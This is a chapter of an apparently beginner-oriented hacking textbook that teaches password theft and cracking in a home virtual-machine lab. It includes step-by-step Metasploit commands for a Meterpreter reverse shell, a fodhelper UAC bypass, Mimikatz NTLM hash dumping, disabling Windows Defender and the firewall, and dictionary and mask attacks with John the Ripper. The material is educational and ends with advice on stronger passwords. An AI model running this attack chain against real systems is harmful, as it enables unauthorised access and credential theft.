<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
	<head>
		<title>Chapter 7: Stealing and Cracking Passwords</title>
		<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:af29b7b1-e841-4e64-a1ef-e03d2d2c1d42" name="Adept.expected.resource"/>
	</head>
	<body epub:type="bodymatter chapter">
		<section>
			<header>
				<h1 class="chapter"><span class="ChapterNumber"><span epub:type="pagebreak" id="Page_73" title="73"/>7</span><br/><span class="ChapterTitle">Stealing and Cracking Passwords</span></h1>
			</header>
			<figure class="opener">
				<img alt="" src="image_fi/book_art/chapterart.png"/>
			</figure>
			<p class="ChapterIntro">In <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span>, you learned how an attacker can create malware to infect your computer and see your files, keystrokes, screen, webcam video, and more. In this chapter, you’ll see how an attacker can use that same malware to steal the encrypted passwords of all users on a Windows computer. Then you’ll find out how hackers <em>crack</em> those passwords, or recover them in their unencrypted, plaintext form.</p>
			<p>If an attacker cracks your password, they may be able to hack into any other account, website, or device where you’ve used that password—even if you’ve added extra characters to make it “unique” for those other accounts. Weak passwords are one of the easiest ways for black hat hackers to break into an organization’s network or into your personal accounts. If your password is strong enough, however, even if an attacker steals the encrypted password, they won’t be able to crack it.</p>
			<h2 id="h1-502000c07-0001"><span epub:type="pagebreak" id="Page_74" title="74"/>Password Hashes</h2>
			<p class="BodyFirst">Modern computer systems and secure websites encrypt passwords with a cryptographic hash function before storing them. Unlike the codes you encounter in spy movies, which are meant to be decoded on the receiving end, a <em>cryptographic hash function</em> encrypts your password in a way that cannot be reversed or decrypted. The hashed version of the password is known as a <em>password hash</em>. Hashes can be viewed as long strings of hexadecimal digits, as in <a href="#listing7-1" id="listinganchor7-1">Listing 7-1</a>.</p>
			<pre><code>359878442cf617606802105e2f439dbc
63191e4ece37523c9fe6bb62a5e64d45
9dddd5ce1b1375bc497feeb871842d4b
4d1f35512954cb227b25bbd92e15bc7b
e6071c75ea19bef227b49e5e304eb2f1</code></pre>
			<p class="CodeListingCaption"><a id="listing7-1">Listing 7-1</a>: Hashed versions of five passwords</p>
			<p>When you log in to a computer or website, the only way for it to check whether you entered the correct password is to run the same hash function on the characters you entered and then compare the result with the password hash stored in its database.</p>
			<p>There are lots of different types of hash functions, but they have several things in common:</p>
			<ul>
				<li>The same input text will always produce the same hash value in a particular hash function; this is necessary so that your stored password hash can be tested against the hash of the password you enter when you return to a site.</li>
				<li>Every hash from a particular hash function will be the same length, no matter how long the input text might be. Since a one-word password and a five-word password will produce the same number of hash characters, the hash function hides the length of your password.</li>
				<li>Changing just one character in the input will cause lots of characters in the hash to change, so adding even a single character to a password changes the hash completely.</li>
			</ul>
			<h2 id="h1-502000c07-0002">Stealing Windows Password Hashes</h2>
			<p class="BodyFirst">In this section, we’ll use your Kali Linux VM to steal password data from your Windows 10 VM. First, we’ll create several usernames and passwords in the Windows 10 VM. Next, we’ll use the Meterpreter remote access trojan to break back into the Windows VM. Then, we’ll use the Mimikatz tool in Metasploit to steal the password hashes from the Windows 10 victim machine.</p>
			<h3 id="h2-502000c07-0001"><span epub:type="pagebreak" id="Page_75" title="75"/>Creating Windows Users</h3>
			<p class="BodyFirst">First, let’s add some users to the Windows 10 VM so we can later steal their password hashes.</p>
			<ol class="decimal">
				<li value="1">Open your Windows 10 VM in VirtualBox (logging in with <code class="bold">IEUser</code> and <code class="bold">Passw0rd!</code>).</li>
				<li value="2">Enter <code class="bold">cmd</code> into the Windows search bar, right-click the <b>Command Prompt</b> app, and click <b>Run as administrator</b>. Click <b>Yes</b> when Windows asks if you want to allow this app to make changes to your device.</li>
				<li value="3">Create a new user account with the same command we used during the Sticky Keys hack back in <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span>:
					<pre><code>C:\WINDOWS\system32&gt; <code class="bold">net user ironman Jarvis /add</code></code></pre>
					<p class="ListBody">This command adds a user called <em>ironman</em> with the password <em>Jarvis</em>.</p>
					</li>
				<li value="4">Now add several more user accounts with passwords of different complexity and length:
					<pre><code>C:\WINDOWS\system32&gt; <code class="bold">net user ana Password1 /add</code>
C:\WINDOWS\system32&gt; <code class="bold">net user ben P@$$w0rd! /add</code>
C:\WINDOWS\system32&gt; <code class="bold">net user carol CaptainMarvel /add</code>
C:\WINDOWS\system32&gt; <code class="bold">net user clark superman20 /add</code>
C:\WINDOWS\system32&gt; <code class="bold">net user kara SuperGirl7! /add</code>
C:\WINDOWS\system32&gt; <code class="bold">net user peter SpidermanRulez:) /add</code></code></pre>
			</li>
				<li value="5">After the last command, Windows will warn you that the password is longer than 14 characters (which was the limit for password length on Windows machines before the year 2000!). Enter <code class="bold">Y</code> to let Windows know you still want to use the long password.</li>
				<li value="6">Finally, create a hard passphrase (made up of at least four words, plus a number or special symbol) for a username with your name—but make sure it’s a fake passphrase that you’re not using on any real accounts, since we’ll be trying to crack it. Here’s mine:
					<pre><code>C:\WINDOWS\system32&gt; <code class="bold">net user </code><var class="bold">bryson Don'tyouwishyourpasswordwastoughlikemine!</var><code class="bold"> /add</code></code></pre>
			</li>
			</ol>
			<p>You may think a passphrase like this is too hard to type every time you log in, but it’s actually easier to remember and harder to guess than most of the passwords you’ve added.</p>
			<h3 id="h2-502000c07-0002">Hacking Back into Windows 10 with Meterpreter</h3>
			<p class="BodyFirst">Next we need to hack back into the Windows 10 VM from Kali.</p>
			<ol class="decimal">
				<li value="1">Start your Kali VM (logging in with username and password <code class="bold">kali</code>) and open the Metasploit app by clicking the Kali menu button and selecting <b>08 - Exploitation Tools</b><span class="MenuArrow">▶</span><b>Metasploit Framework</b>.</li>
				<li value="2"><span epub:type="pagebreak" id="Page_76" title="76"/>At the <code>msf6</code> command prompt, enter the following command to start your Kali web server again:
					<pre><code>msf6 &gt;<code> </code><code class="bold">sudo service apache2 start</code></code></pre>
					<p class="ListBody">The web server will serve the <em>10.0.9.x/share</em> folder containing your Windows malware in case you need to download it again.</p>
					</li>
				<li value="3">Enter the following four commands in Metasploit to listen for the Meterpreter trojan to phone home:
					<pre><code>msf6 &gt;<code> </code><code class="bold">use exploit/multi/handler</code>
msf6 exploit(multi/handler) &gt; <code class="bold">set PAYLOAD windows/meterpreter/reverse_tcp</code>
msf6 exploit(multi/handler) &gt;<code> </code><code class="bold">set LHOST </code><var class="bold">10.0.9.x</var>
msf6 exploit(multi/handler) &gt;<code> </code><code class="bold">exploit -j</code></code></pre>
					<p class="ListBody">Remember to change <var>10.0.9.x</var> to your Kali VM’s IP address (enter <code class="bold">ip</code> <code class="bold">addr</code>, or <code class="bold">ip</code> <code class="bold">a</code> for short, to see the IP address).</p>
					</li>
				<li value="4">Switch back to your Windows 10 VM. Turn off your Windows Defender real-time virus protection: enter <code class="bold">virus</code> into the Windows search bar, open <b>Virus &amp; threat protection settings</b>, click <b>Manage settings</b>, and slide the toggle under Real-time protection to <b>Off</b>.</li>
				<li value="5">Enter the following command into an administrator command prompt in the Windows 10 VM to disable the Windows Firewall as well:
					<pre><code>C:\Windows\system32&gt; <code class="bold">netsh advfirewall set allprofiles state off</code></code></pre>
					<p class="ListBody">Windows will respond with <code>Ok.</code>.</p>
					</li>
				<li value="6">Find the Meterpreter trojan executable file you created in <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span>. This file should still be in your <em>Downloads</em> or <em>Documents</em> folder. If Windows Defender has removed it, open the Edge browser, go to <em>http://&lt;10.0.9.4&gt;/share/</em> (substitute your Kali VM’s IP address if it’s different from <em>10.0.9.4</em>), and download the trojan again. Check your Virus &amp; threat protection settings again to make sure real-time protection is turned off. Then double-click the trojan to run it.</li>
				<li value="7">Switch back to your Kali VM, and you should see a Meterpreter session opened:
					<pre><code>msf6 exploit(multi/handler) &gt;<code> [*] Sending stage (179779 bytes) to 10.0.9.5</code><code>[*] Meterpreter session 1 opened (10.0.9.4:4444 -&gt; 10.0.9.5:50789) at 2020-06-17 15:40:38 -0400</code></code></pre>
			</li>
			</ol>
			<h3 id="h2-502000c07-0003">Escalating Privileges</h3>
			<p class="BodyFirst">Stealing Windows passwords requires administrator- or system-level privileges, a higher level of access than the IEUser account that you used to run <span epub:type="pagebreak" id="Page_77" title="77"/>the Meterpreter trojan. Thanks to Metasploit, we’ll be able to raise our access level with another exploit. This process is known as <em>privilege escalation</em>.</p>
			<p>
				We’ll use a Metasploit exploit of the Windows <code>fodhelper</code> vulnerability to get system-level access. Windows uses a program called <em>fodhelper.exe</em> (the <em>fod</em> is short for “features on demand”) to manage regional settings like the keyboard layout for your language of choice. This app is a good target for hackers because it runs with higher privileges to be able to change language settings across multiple apps, such as your web browser, word processor, and desktop.</p>
			<ol class="decimal">
				<li value="1">In your Kali VM, make sure you’re at the <code>msf6</code> command prompt, not interacting with a Meterpreter session. If you see the <code>meterpreter &gt;</code> command prompt, enter <code class="bold">background</code> to return to the regular <code>msf6</code> command prompt:
					<pre><code>meterpreter &gt; <code class="bold">background</code>[*] Backgrounding session 1...
msf6 exploit(multi/handler) &gt;</code></pre>
			</li>
				<li value="2">From the <code>msf6</code> prompt, enter the five commands shown in bold:
					<pre><code>msf6 exploit(multi/handler) &gt; <code class="bold">set PAYLOAD windows/meterpreter/reverse_tcp</code>
PAYLOAD =&gt; windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; <code class="bold">use exploit/windows/local/bypassuac_fodhelper</code>
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_fodhelper) &gt;<code> </code><code class="bold">set SESSION </code><var class="bold">1</var>
SESSION =&gt; <var>X</var>
msf6 exploit(windows/local/bypassuac_fodhelper) &gt; <code class="bold">set LHOST </code><var class="bold">10.0.9.x</var>
LHOST =&gt; <var>10.0.9.x</var>
msf6 exploit(windows/local/bypassuac_fodhelper) &gt; <code class="bold">exploit</code></code></pre>
					<p class="ListBody">Change the <code>set</code> <code>SESSION</code> command to match your session number (if it isn’t 1) and change the <code>LHOST</code> IP address to match that of your Kali machine.</p>
					</li>
				<li value="3">The last command, <code>exploit</code>, might take a couple of tries. If you get a message stating <code>no</code> <code>session</code> <code>was</code> <code>created</code>, use the up arrow and press <span class="KeyCaps">enter</span> to run the <code>exploit</code> command again. When it succeeds, you’ll see <code>Meterpreter</code> <code>session</code> <code>2</code> <code>opened</code>, meaning that the exploit has opened a second session. Your command prompt will change back to <code>meterpreter &gt;</code> to indicate that you’re interacting with a new Meterpreter session. 
					<p class="ListBody">Privilege escalation is the highest-level, most technically challenging hack you’ll perform in this book, and it might take several tries. If you keep seeing “no session created” messages, check your Windows 10 VM to make sure Windows Defender’s Virus &amp; threat protection settings are still turned off. If you’re still stuck, try rerunning the hack from the beginning. And, at some point in the next five years, there’s a good chance Windows will fix the <code>fodhelper</code> vulnerability and you’ll have to <span epub:type="pagebreak" id="Page_78" title="78"/>try a different exploit. Check the book’s website at <a class="LinkURL" href="https://www.nostarch.com/go-hck-yourself/">https://www.nostarch.com/go-hck-yourself/</a> for updates or do a web search for “Metasploit privilege escalation” on the latest version of Windows.</p>
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="note">
							<h2><span class="NoteHead">NOTE</span></h2>
							<p>
									If you get an error that says the user or session is already in an “elevated state,” the IEUser account on your VM is already an administrator instead of a regular user. In that case, type <code>sessions -i 1</code> to interact with your original session again and proceed to the <code>getsystem</code> command in the next step.</p>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="4">Enter <code class="bold">getsystem</code> in Meterpreter to get system-level access to the Windows 10 VM:
					<pre><code>meterpreter &gt;<code> </code><code class="bold">getsystem</code>
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</code></pre>
			</li>
				<li value="5">Check that you’ve got system-level access by entering <code class="bold">getuid</code>:
					<pre><code>meterpreter &gt;<code> </code><code class="bold">getuid</code>
Server username: NT AUTHORITY\SYSTEM</code></pre>
					<p class="ListBody">Meterpreter will respond that your user ID is <code>NT</code> <code>Authority\System</code>, indicating that you now have system-level access.</p>
					</li>
			</ol>
			<h3 id="h2-502000c07-0004">Stealing Password Hashes with Mimikatz</h3>
			<p class="BodyFirst">Now that we have system-level privileges, we’re ready to steal the password hashes. We’ll use Mimikatz, a hacking tool that can access Windows passwords from multiple locations, including directly from the memory of the computer while it’s running. The Mimikatz module in Metasploit is named <code>kiwi</code> (the New Zealander who wrote Mimikatz, Benjamin Delpy, calls himself the Gentil Kiwi).</p>
			<ol class="decimal">
				<li value="1">Enter <code class="bold">use</code> <code class="bold">kiwi</code> at the Meterpreter prompt to load the Mimikatz tools: 
					<pre><code>meterpreter &gt; <code class="bold">use kiwi</code></code></pre>
			</li>
				<li value="2">The Mimikatz startup screen will appear in your Meterpreter console. Now we can dump the password hashes for all users from the Windows 10 VM, like so: 
					<pre><code>meterpreter &gt;<code> </code><code class="bold">lsa_dump_sam</code></code></pre>
			</li>
				<li value="3">Mimikatz will answer by listing all the users and Windows password hashes it can find:
					<pre><code>[+] Running as SYSTEM
[*] Dumping SAM<em>--snip--</em>
RID  : 000003f0 (1008)
User : peter<span epub:type="pagebreak" id="Page_79" title="79"/>  Hash NTLM: e262404bfe47aa34ba668187b4209380
RID  : 000003f1 (1009)
User : bryson Hash NTLM: 0a2b1c4f5d7ad37f9e2df24ff3ab4c48 </code></pre>
					<p class="ListBody">The password hashes use the <em>New Technology LAN Manager (NTLM) format</em>, one of the ways that Windows computers store login information, including password hashes. We’ll select this type of password hash later when we crack the passwords.</p>
					</li>
				<li value="4">To crack the password hashes, we need to gather them in a text document. Highlight the usernames and NTLM hashes, right-click the selection, and choose <b>Copy</b> (you can’t use <span class="KeyCaps">ctrl</span>-C to copy in the Metasploit console; that’s the command to quit or close a running process in a terminal window).</li>
				<li value="5">Open the Mousepad Text Editor by clicking the Kali menu button and selecting <b>Favorites</b><span class="MenuArrow">▶</span><b>Text Editor</b>. Press <span class="KeyCaps">ctrl</span>-V to paste the text you copied from Meterpreter into Mousepad.</li>
				<li value="6">Click <b>File</b><span class="MenuArrow">▶</span><b>New</b> to open a second Mousepad window. Copy and paste just the usernames and password hashes into this new document in the format <var>username</var><code>:</code><var>hash</var>, with one username and hash value per line, separated by a colon, as shown in <a href="#figure7-1" id="figureanchor7-1">Figure 7-1</a>. Make sure there are no extra spaces.
					<figure>
						<img alt="f07001" class="" src="image_fi/502000c07/f07001.png"/>
						<figcaption>
							<p><a id="figure7-1">Figure 7-1</a>: Copying and pasting the usernames and NTLM hash values into a new text file</p>
						</figcaption>
					</figure>
					<p class="ListBody">Skip any users without hash values or any of the accounts Windows created, like sshd, Guest, and DefaultAccount. You’re interested only in real user and admin accounts, like IEUser, Administrator, and the user accounts you created earlier in the chapter.</p>
					<aside epub:type="sidebar">
						<div class="top hr">
							<hr/>
						</div>
						<section class="note">
							<h2><span class="NoteHead">WARNING</span></h2>
							<p>
									You may have noticed that the Administrator account password hash is the same as the IEUser hash (<code>fc525</code>. . .). This means that the Administrator password is the same as the IEUser password, <code>Passw0rd!</code>. Never reuse passwords like this on a real computer; Microsoft has just done it for convenience since the VMs are for trial use.</p>
							<div class="bottom hr">
								<hr/>
							</div>
						</section>
					</aside>
			</li>
				<li value="7">Save the file as <em>Windows_hashes.txt</em> in your <em>Documents</em> folder.</li>
			</ol>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note"><span epub:type="pagebreak" id="Page_80" title="80"/>
				<h2><span class="NoteHead">Note</span></h2>
					<p>
							If you have any trouble, you can also go to <a class="LinkURL" href="https://www.nostarch.com/go-hck-yourself/">https://www.nostarch.com/go-hck-yourself/</a> and download the <em>Windows_hashes.txt</em> file available there.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<h2 id="h1-502000c07-0003">Cracking Passwords</h2>
			<p class="BodyFirst">Now that we have a document of usernames and password hashes stolen from the Windows VM, we’re ready to begin cracking the passwords. Hackers take a few different approaches to password cracking. A <em>dictionary attack</em> uses a list of common passwords, hashing each one to see if it matches the hash you’re trying to crack. Dictionary attacks are fast, but they only help with relatively simple passwords. A <em>brute-force attack</em> systematically tries every combination of characters to find even highly complex passwords up to a certain length. This makes brute-force attacks very thorough, but extremely slow. A <em>mask attack</em> is a special type of brute-force attack we use when we know part of the password and have to brute-force just a few characters.</p>
			<p>We’ll try out a few approaches to password cracking. As you’ll see, the internet and Kali Linux have resources that make short work of cracking passwords. First, you’ll search a free online password database to crack common password hashes. Then, you’ll use one of Kali’s many password-cracking tools, John the Ripper, to crack more of the hashes. You’ll start with a password dictionary attack for the easier passwords, and you’ll finish with a mask attack.</p>
			<h3 id="h2-502000c07-0005">Free Online Password Databases</h3>
			<p class="BodyFirst">Hashes.com is a web service that allows you to search for passwords in a database of <em>billions</em> of previously cracked hashes. Every time you hash a particular password, you get the same hash, so the database can store each password with its hash. When you search for a hash, the database returns the unencrypted password (if that password is in the database).</p>
			<ol class="decimal">
				<li value="1">In your Kali VM, open the Firefox browser and go to <a class="LinkURL" href="https://hashes.com/decrypt/hash/">https://hashes.com/decrypt/hash/</a>.</li>
				<li value="2">Paste the usernames and password hashes from your <em>Windows_hashes.txt</em> file into the Hashes text box. Then remove the usernames so that only the hashes appear in the box, as shown in <a href="#figure7-2" id="figureanchor7-2">Figure 7-2</a>.</li>
				<li value="3">Click <b>Submit &amp; Search</b> to search the Hashes.com database. After a few moments, you should see a list of cracked passwords:
					<pre><code>64f12cddaa88057e06a81b54e73b949b:Password1
85f4aaf6ac4fac1d9b55e6b880bcda3e:CaptainMarvel
920ae267e048417fcfe00f49ecbd4b33:P@$$w0rd!
d6566eae841e523df8fd96a42bcbd4ac:superman20
fc525c9683e8fe067095ba2ddc971889:Passw0rd!<var>--snip--</var></code></pre>
			<span epub:type="pagebreak" id="Page_81" title="81"/><figure>
						<img alt="f07002" class="" src="image_fi/502000c07/f07002.png"/>
						<figcaption>
							<p><a id="figure7-2">Figure 7-2</a>: Hashes.com takes your NTLM hashes as input and outputs any cracked passwords it finds in its database.</p>
						</figcaption>
					</figure>
					</li>
			</ol>
			<p>Hashes.com found five of the passwords! Because it keeps adding new passwords to its database, it may be able to crack more of the simple passwords we will use over the course of this book.</p>
			<p>
				We’ve been able to recover at least five passwords from our Windows VM using a free online lookup tool—and an attacker may need only <em>one</em> username and password to be able to hack into a network, company, or government agency. That’s why it’s important for <em>every user</em> in an organization to choose longer, harder-to-guess passwords.</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">NOTE</span></h2>
					<p>
							If the Hashes.com website changes or disappears, search for “hash lookup service” to find another site. Just be careful which ones you visit and be sure to search from within your virtual machine. Use <a class="LinkURL" href="https://www.virustotal.com/">https://www.virustotal.com/</a> to scan the URL of the site before you visit. Some password-cracking sites are actually malicious web pages set up to lure amateur hackers into installing malware.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<h3 id="h2-502000c07-0006">John the Ripper</h3>
			<p class="BodyFirst">John the Ripper, often abbreviated to JtR or simply John, is one of the oldest tools for cracking passwords; it’s been over 20 years since the first version of John was released. John is included in Kali Linux under the Kali menu button’s 05 - Password Attacks menu.</p>
			<p>
				John runs from the command line terminal, but there’s another version of John, called Johnny, with a graphical user interface (GUI) that’s easier to work with. Johnny isn’t included in the most recent versions of <span epub:type="pagebreak" id="Page_82" title="82"/>Kali. To install it, open a new terminal window and type the following two commands:</p>
			<pre><code>kali@kali:~$ <b>sudo apt update</b>
kali@kali:~$ <b>sudo apt install johnny</b></code></pre>
			<p>
				You may have to enter your password (<code>kali</code>) after the first command. After installation, Johnny will usually appear on the 05 - Password Attacks menu below John, but you can also run it from the terminal by typing <code>johnny</code>.</p>
			<p>We’ll use two methods in Johnny to crack more of our stolen Windows passwords. We’ll try a dictionary attack to crack common passwords and a mask attack to crack passwords with variations. Everything you do in Johnny can also be done from the terminal with John; after you use Johnny, you can look up commands for John and try them to understand the overall process.</p>
			<h4 id="h3-502000c07-0001">A Dictionary Attack</h4>
			<p class="BodyFirst">We’ll begin by trying a dictionary attack. Also called a <em>wordlist attack</em>, a <em>dictionary attack</em> tests a list of words against the hashes we’re trying to crack. John the Ripper will hash each password in a long list of common passwords we provide, comparing each hash value to our Windows hashes. If it finds a match, we’ve cracked that password.</p>
			<p>Kali has several built-in wordlists, including the RockYou wordlist. RockYou was a company that lost 32 million users’ passwords in a famous 2009 breach involving a poorly protected web application. The list of plaintext passwords exposed by RockYou is still one of the best free wordlists for checking the security of a password.</p>
			<ol class="decimal">
				<li value="1">To access the RockYou wordlist, enter the following command in the terminal window:
					<pre><code>kali@kali:~$ <code class="bold">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></code></pre>
					<p class="ListBody">This command will extract the wordlist as <em>rockyou.txt</em> in the <em>/usr/share/wordlists</em> folder so that it can be used as a dictionary in John and Johnny.</p>
					</li>
				<li value="2">Open Johnny by clicking the Kali menu button and selecting <b>05 - Password Attacks</b><span class="MenuArrow">▶</span><b>johnny</b>.</li>
				<li value="3">Click <b>Open password file</b><span class="MenuArrow">▶</span><b>Open password file (PASSWD format)</b>. Find the <em>Windows_hashes.txt</em> file we created earlier, as shown in <a href="#figure7-3" id="figureanchor7-3">Figure 7-3</a>, and select it to load the password hash file.<span epub:type="pagebreak" id="Page_83" title="83"/>
				<figure><img alt="f07003" class="" src="image_fi/502000c07/f07003.png"/><figcaption>
							<p><a id="figure7-3">Figure 7-3</a>: Opening the <em>Windows_hashes.txt</em> password file in Johnny</p>
						</figcaption>
					</figure>
					</li>
				<li value="4">Click <b>Options</b> on the left in Johnny and then click the <b>Wordlist</b> tab under Attack mode in the Options window. Type <code class="bold">/usr/share/wordlists/rockyou.txt</code> into the Wordlist file: text box, as shown in <a href="#figure7-4" id="figureanchor7-4">Figure 7-4</a>.
					<figure>
						<img alt="f07004" class="" src="image_fi/502000c07/f07004.png"/>
						<figcaption>
							<p><a id="figure7-4">Figure 7-4</a>: Loading the <em>rockyou.txt</em> wordlist through Johnny</p>
						</figcaption>
					</figure>
					</li>
				<li value="5">Still in the Options window, under Session details, select <b>NT</b> from the Current hash format: drop-down list, as shown in <a href="#figure7-5" id="figureanchor7-5">Figure 7-5</a>. This tells Johnny that the password hashes are in NTLM format.<span epub:type="pagebreak" id="Page_84" title="84"/>
				<figure><img alt="f07005" class="" src="image_fi/502000c07/f07005.png"/><figcaption>
							<p><a id="figure7-5">Figure 7-5</a>: Choosing <em>NT</em> as the input password hash format</p>
						</figcaption>
					</figure>
					</li>
				<li value="6">Click <b>Passwords</b> on the left and then click <b>Start new attack</b> at the top.</li>
			</ol>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">Note</span></h2>
					<p>
							If Johnny responds with an error message saying it’s not able to find John the Ripper, click <b>Settings</b> on the left and type <code>/usr/sbin/john</code> in the John the Ripper Executable: text box. Then click <b>Start new attack</b> again.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<p>
				Almost instantly, Johnny will display several cracked passwords, as shown in <a href="#figure7-6" id="figureanchor7-6">Figure 7-6</a>. (If you don’t see any, make sure you changed the current hash format to NT in step 5.)</p>
			<figure>
				<img alt="f07006" class="" src="image_fi/502000c07/f07006.png"/>
				<figcaption>
					<p><a id="figure7-6">Figure 7-6</a>: It takes Johnny almost no time to crack five or six passwords using the hashes we captured.</p>
				</figcaption>
			</figure>
			<p>It took us a few minutes to capture the password hashes, but less than a second to crack the first five or six passwords using a dictionary attack with the RockYou wordlist. That’s all the work a malicious hacker needs to do to get your passwords if you’using simple one- or two-word passwords with just a few numbers and symbols.</p>
			<p>The RockYou wordlist contained several of the passwords we set up for our users. The other passwords were complex enough that they didn’t appear in the list. Let’s see how to crack one or two more passwords using another option in Johnny—a mask attack.</p>
			<h4 id="h3-502000c07-0002"><span epub:type="pagebreak" id="Page_85" title="85"/>A Mask Attack</h4>
			<p class="BodyFirst">A <em>mask attack</em> starts with partial information, like an old password, and adds characters to try cracking similar passwords. There’s a good chance that you or someone you know is reusing an old password by adding digits or symbols to the end, like <em>badpassword20!</em>. This behavior is more common than you’d think, and it makes many passwords susceptible to mask attacks.</p>
			<p>
				Mask attacks are also effective if an attacker gains access to a fragment of someone’s password. Imagine Kara, one of our Windows users, has a job at CatCo Worldwide Media. While passing by Kara’s desk, a snoopy co-worker sees a sticky note Kara has thrown in the trash. It’s torn, but it looks like it might have part of a password written on it: <em>SuperGir</em> (see <a href="#figure7-7" id="figureanchor7-7">Figure 7-7</a>).</p>
			<p>
				Social engineers call this <em>dumpster diving</em>—literally looking through someone’s trash for useful information, like bank statements, credit card offers, or passwords scribbled on the back of an envelope or on a sticky note like this one.</p>
			<figure>
				<img alt="f07007" class="" src="image_fi/502000c07/f07007.png"/>
				<figcaption>
					<p><a id="figure7-7">Figure 7-7</a>: Kara’s torn sticky note with what looks like part of her password</p>
				</figcaption>
			</figure>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="note">
					<h2><span class="NoteHead">WARNING</span></h2>
					<p>	Don’t make Kara’s mistake. Buy a shredder.</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<p>
				In Johnny, we can add wildcard characters to the end of <em>SuperGir</em> to try to guess what the rest of Kara’s password might be. A <em>wildcard</em> is a placeholder that can be replaced by any one of a group of letters, numbers, or symbols. We can use the wildcard characters <em>?u</em> for uppercase letters, <span epub:type="pagebreak" id="Page_86" title="86"/>?l for lowercase letters, <em>?d</em> for digits (0–9), <em>?s</em> for special symbols, or <em>?a</em> for all printable characters (letters, numbers, punctuation, and special characters).</p>
			<p>
				We can use the part of the password that we know (<em>SuperGir</em>), plus some wildcard characters, to create a mask. A <em>mask</em> decreases the number of password combinations we have to try by filling in the characters that we know already (in this case, the first eight characters: <em>SuperGir</em>). We don’t know whether Kara’s password ends in numbers, letters, or special characters based on the sticky note, so let’s use a mask of <em>SuperGir?a</em> to start.</p>
			<ol class="decimal">
				<li value="1">In Johnny, click <b>Options</b> on the left, click the <b>Mask</b> tab, and enter <code class="bold">SuperGir?a</code> into the Mask: text box.</li>
				<li value="2">Click <b>Start new attack</b> at the top. Then, to see if Kara’s password was cracked, click <b>Passwords </b>on the left. You should see that a single wildcard character after SuperGir wasn’t able to crack the password.</li>
				<li value="3">Go back to the <b>Mask</b> tab, enter two wildcard characters, <code class="bold">SuperGir?a?a</code>, and try it again.</li>
				<li value="4">Still nothing? Enter a third wildcard character, <code class="bold">SuperGir?a?a?a</code>, as shown in <a href="#figure7-8" id="figureanchor7-8">Figure 7-8</a>. Then click <b>Start new attack</b> again.</li>
			</ol>
			<figure>
				<img alt="f07008" class="" src="image_fi/502000c07/f07008.png"/>
				<figcaption>
					<p><a id="figure7-8">Figure 7-8</a>: Using a mask attack—putting wildcard characters after the partial password found on a sticky note—to crack Kara’s password</p>
				</figcaption>
			</figure>
			<p>
				This time, the progress bar at the bottom of the window in <a href="#figure7-8">Figure 7-8</a> should change to show that Johnny was able to crack one additional password. Click <b>Passwords</b> again. Now, next to <em>kara</em>, you’ll see her password, <em>SuperGirl7!</em>, as shown in <a href="#figure7-9" id="figureanchor7-9">Figure 7-9</a>.</p>
				<span epub:type="pagebreak" id="Page_87" title="87"/>
				<figure>
				<img alt="f07009" class="" src="image_fi/502000c07/f07009.png"/>
				<figcaption>
					<p><a id="figure7-9">Figure 7-9</a>: The password mask <var>SuperGir?a?a?a</var> was able to crack Kara’s password (<em>SuperGirl7!</em>) in less than a second!</p>
				</figcaption>
			</figure>
			<p>
				Even though we had only part of Kara’s password, we were able to use a mask attack to guess her complete password. It took Johnny less than a second to try the thousands of possibilities, from <em>SuperGir000</em> to <em>SuperGirl7!</em>, one by one. That means that if you reuse a password by changing only numbers and symbols at the beginning, middle, or end, a hacker who finds one of your old passwords can guess your current password in seconds using Johnny or a similar tool.</p>
			<p>
				You can also use a mask attack for Peter’s password. Enter a few wildcard characters—starting with <code class="bold">SpidermanRu?a</code>, then <code class="bold">SpidermanRu?a?a</code>, and so on—until you crack the full password. The last round may take five or six minutes to run, as each added character increases the complexity exponentially (3 wildcards take less than a second, 4 wildcards take three to four seconds, 5 wildcards take five to six minutes, 6 wildcards take almost nine hours, and 14 wildcards would take thousands of years!).</p>
			<p>The exponential increase in the time it takes to crack longer passwords is exactly why everyone should use long passwords. No matter how many years we run Johnny, we’re not likely to crack our long passphrase, the final password you created. Long passwords are one of the tricks we can use to keep hackers out of our accounts.</p>
			<aside epub:type="sidebar">
				<div class="top hr">
					<hr/>
				</div>
				<section class="box">
					<h2>Cracking Other Types of Hashes</h2>
					<p class="BoxBodyFirst">Most password-cracking tools, including Johnny and Hashes.com, can crack a variety of password formats. Try to use Johnny or Hashes.com to crack the five passwords in <a href="#listing7-1">Listing 7-1</a> on <span class="xref" itemid="xref_target_page 74">page 74</span>. Then flip to <a href="#listing7-2" id="listinganchor7-2">Listing 7-2</a> on <span class="xref" itemid="xref_target_page 89">page 89</span> to check your results. (Hint: The format of these passwords is raw MD5.)</p>
					<div class="bottom hr">
						<hr/>
					</div>
				</section>
			</aside>
			<h2 id="h1-502000c07-0004"><span epub:type="pagebreak" id="Page_88" title="88"/>Using Safer Passwords</h2>
			<p class="BodyFirst">You can make your passwords too hard for even pros to crack with just a couple of changes. First, generally the longer a password is, the safer it will be. To make a strong passphrase, pick four or more random, unrelated words and string them together. To make your passphrase almost uncrackable, add a few numbers or special characters.</p>
			<p>
